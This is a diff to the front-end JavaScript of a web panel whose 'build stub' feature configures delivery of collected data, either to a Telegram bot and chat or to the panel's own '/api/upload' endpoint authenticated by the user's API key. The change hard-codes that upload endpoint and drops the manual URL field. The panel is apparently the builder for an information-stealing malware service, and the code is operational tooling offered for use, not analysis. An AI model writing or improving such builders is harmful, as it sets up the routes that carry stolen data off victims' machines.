@@ -351,11 +351,6 @@ function initAuthUI() {
         document.getElementById('nav-admin-section').style.display = 'block';
     }
 
-    // Pre-fill builder API key
-    const secretField = document.getElementById('build-panel-secret');
-    if (secretField && currentUser.api_key) {
-        secretField.value = currentUser.api_key;
-    }
 
     // Logout button
     document.getElementById('logout-btn').addEventListener('click', async () => {
@@ -1014,18 +1009,13 @@ document.getElementById('btn-build-stub').addEventListener('click', async () => 
     const delivery = document.querySelector('input[name="build-delivery"]:checked').value;
     const botToken = document.getElementById('build-tg-token').value.trim();
     const chatId = document.getElementById('build-tg-chat').value.trim();
-    const panelUrl = document.getElementById('build-panel-url').value.trim();
-    const secretKey = document.getElementById('build-panel-secret').value.trim();
+    const panelUrl = window.location.origin + '/api/upload';
+    const secretKey = currentUser.api_key || '';
 
     // Validation
     if (delivery === 'TELEGRAM') {
         if (!botToken || !chatId) {
             log('Error: Telegram Bot Token and Chat ID are required!', 'error');
-            return;
-        }
-    } else {
-        if (!panelUrl) {
-            log('Error: Web Panel URL is required!', 'error');
             return;
         }
     }
